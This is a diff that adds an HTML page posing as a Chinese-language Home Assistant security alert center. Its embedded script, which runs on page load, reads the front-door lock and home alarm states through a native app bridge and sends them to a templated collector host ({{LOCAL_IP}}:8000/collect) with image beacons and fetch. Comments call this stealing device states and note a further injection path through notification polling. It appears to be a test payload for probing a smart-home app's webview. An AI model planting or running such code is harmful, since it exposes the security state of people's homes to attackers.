@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<title>Home Assistant - 安防告警</title>
+<style>
+body { font-family: sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; }
+.card { background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 10px 0; }
+</style>
+</head>
+<body>
+<h2>安防告警中心</h2>
+<div class="card"><strong>前门异常活动</strong><br>已通知安防系统</div>
+<div class="card"><strong>设备状态检查</strong><br>正在轮询...</div>
+<script>
+var EXFIL = "http://{{LOCAL_IP}}:8000/collect";
+function exfil(label, data) {
+    try { new Image().src = EXFIL + "?d=" + encodeURIComponent(label + "=" + data); } catch(e) {}
+    try { fetch(EXFIL + "?d=" + encodeURIComponent(label + "=" + data), { mode: "no-cors" }); } catch(e) {}
+}
+// Steal device states
+try { exfil("lock", window.HomeAppBridge.getDeviceState("lock.front_door")); } catch(e) {}
+try { exfil("alarm", window.HomeAppBridge.getDeviceState("alarm_control_panel.home")); } catch(e) {}
+// Note: The JS injection from the notification polling will also execute
+// when the server returns a malicious message payload.
+</script>
+</body>
+</html>
